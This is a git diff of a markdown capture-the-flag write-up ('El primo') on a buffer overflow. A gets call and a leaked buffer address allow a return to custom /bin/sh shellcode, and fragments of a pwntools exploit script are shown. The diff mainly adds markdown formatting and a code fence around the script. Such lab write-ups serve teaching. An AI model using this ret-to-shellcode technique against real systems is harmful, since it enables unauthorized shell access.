@@ -1,4 +1,4 @@
-El primo
+# El primo
 
 There's no NX, AND a gets call. On top of this, the program sends us the buffer address. A simple ret to shellcode, right?
 
@@ -12,9 +12,9 @@ Then, we change the beginning of our buffer to be the address of our shellcode.I
 
 We can use pattern.py to figure out the amount of bytes until esp, which is 32.
 
-NOTE! it subtracts 4 from our chosen esp value, so we must take care of this.
-Script soon to come. I created custom shellcode that had to have the address of a string /bin/sh which I also put in the input.
-
+### NOTE! it subtracts 4 from our chosen esp value, so we must take care of this.
+I created custom shellcode that had to have the address of a string /bin/sh which I also put in the input.
+```python
 from pwn import *
 import re
 NUM_TO_ESP = 32
@@ -31,4 +31,4 @@ payload += p32(espval)
 payload += shellcode
 p.sendline(payload)
 p.interactive()
-
+```
